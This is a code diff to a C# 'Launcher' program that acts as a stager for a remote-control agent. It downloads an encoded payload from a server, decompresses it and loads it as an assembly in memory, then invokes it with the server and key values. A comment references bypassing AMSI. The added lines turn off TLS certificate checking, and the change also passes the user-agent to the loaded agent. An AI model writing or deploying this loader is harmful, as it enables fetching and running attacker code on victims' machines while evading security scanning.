@@ -13,6 +13,8 @@ namespace Launcher
         public static void Main() {
             //bypass amsi
             string u = "";
+            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
+            ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
             WebClient wc = new WebClient();
             wc.Headers.Add("User-Agent", u);
             wc.Proxy = WebRequest.DefaultWebProxy;
@@ -24,7 +26,7 @@ namespace Launcher
             byte[] data = wc.DownloadData(ser+t);
             string decryptedAssembly = Encoding.ASCII.GetString(data);
             Assembly agentAssembly = Assembly.Load(Decompress(Convert.FromBase64String(decryptedAssembly)));
-            agentAssembly.GetTypes()[0].GetMethods()[0].Invoke(null, new Object[] { ser,k });
+            agentAssembly.GetTypes()[0].GetMethods()[0].Invoke(null, new Object[] { ser,k,u });
 
         }
         private static byte[] Decompress(byte[] compressed)
